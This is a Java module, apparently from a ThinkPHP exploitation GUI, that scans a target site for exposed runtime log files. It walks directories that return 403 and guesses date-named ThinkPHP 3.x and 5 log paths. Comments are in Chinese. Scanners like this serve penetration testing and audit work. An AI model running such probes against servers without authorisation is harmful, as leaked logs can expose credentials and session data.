package exploit;

import com.example.thinkphpgui.ConfigManager;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;

public class Tp_Log_Leak implements Exploit {

    private final ConfigManager configManager = ConfigManager.getInstance();

    private static final List<String> dirList = Collections.unmodifiableList(Arrays.asList("public/", "Public", "App/", "app/", "Application/", "application/", "Logs/", "logs/", "log/", "Log/", "Runtime/", "runtime/", "home/", "Home/", "Admin/", "admin/", "Ext/", "ext/", "Api/", "api/", "Test/", "test/", "Common/", "common/", "Service/", "service/"));
    private final List<String> logList = initLogPathList();


    private final List<String> _403PathList = Arrays.asList(
            "Runtime/Logs/",
            "App/Runtime/Logs/",
            "Application/Runtime/Logs/Admin/",
            "Application/Runtime/Logs/Home/",
            "Application/Runtime/Logs/App/",
            "Application/Runtime/Logs/Ext/",
            "Application/Runtime/Logs/Api/",
            "Application/Runtime/Logs/Test/",
            "Application/Runtime/Logs/Common/",
            "Application/Runtime/Logs/Service/",
            "Application/Runtime/Logs/",
            "runtime/log/",
            "App/Runtime/Logs/Home/",
            "App/Runtime/Logs/Api/"
    );


    private List<String> initLogPathList() {
        List<String> tempLogPathList = new ArrayList<>();
        Date date = new Date();
        int fullYear = Integer.parseInt(String.format("%tY", date));
        int year = Integer.parseInt(String.format("%ty", date));
        String month = String.format("%tm", date);
        String day = String.format("%td", date);

        List<Integer> yearList = new ArrayList<>();
        for (int i = 0; i <= 3; i++) {
            yearList.add(fullYear - i);
            yearList.add(year - i);
        }

        List<String> separatorList = Arrays.asList("-", "_", "/");

        for (int y : yearList) {
            for (String s : separatorList) {
                String path1 = y + s + month + s + day + ".log"; //thinkphp 3.x
                String path2 = y + month + s + day + ".log"; //thinkphp 5
                String path3 = y + month + s + day + "_cli.log";  //thinkphp 5
                tempLogPathList.add(path1);
                tempLogPathList.add(path2);
                tempLogPathList.add(path3);
            }

        }
        // 去重
        return new ArrayList<>(new HashSet<>(tempLogPathList));
    }

    @Override
    public void startScan(String url) throws IOException {

        verify(url);
    }

    private void verify(String url) throws IOException {
        dirScan(url, 0);
        if (!_403PathList.isEmpty() && _403PathList.size() < 40) {
            for (String path : _403PathList) {
                if (logScan(url + path)) {
                    return;
                }
            }
        }
        configManager.appendToTextArea("[-] " + url + "   不存在日志泄露");
    }


    private void dirScan(String url, int depth) throws IOException {
        if (_403PathList.size() > 30 || depth > 6) { //误报
            return;
        }

        for (String path : dirList) {
            if (_403PathList.size() > 30) {
                return;
            }

            try {
                HttpURLConnection httpURLConnection = HttpRequestUtil.get(url + path);
                if (httpURLConnection.getResponseCode() == 403) {
                    String fullPath = (url + path).replaceFirst("^https?://[^/]+/", ""); // 去掉域名部分
                    _403PathList.add(fullPath);
                    // 去重
                    Set<String> set = new HashSet<>(_403PathList);
                    if (!set.isEmpty()) {
                        _403PathList.clear();
                        _403PathList.addAll(set);
                    }

                    dirScan(url + path, depth + 1);
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private Boolean logScan(String url) throws IOException {

        try {
            for (String log : logList) {
                HttpURLConnection httpURLConnection = HttpRequestUtil.get(url + log);
                if ((httpURLConnection.getResponseCode() == 200 && httpURLConnection.getContentLength() > 1000)) {// && checkResponse(httpURLConnection)
                    configManager.appendToTextArea("[+] 存在日志泄露: " + url + log);
                    return true;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }


    private boolean checkResponse(HttpURLConnection conn) {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                String lower = line.toLowerCase();
                if (lower.contains("require(")) {
                    return false; // 只要出现了require(，就说明不行，返回false
                }
            }
            return true; // 读完整个网页都没出现require(，返回true
        } catch (IOException e) {
            return false;
        }
    }

}
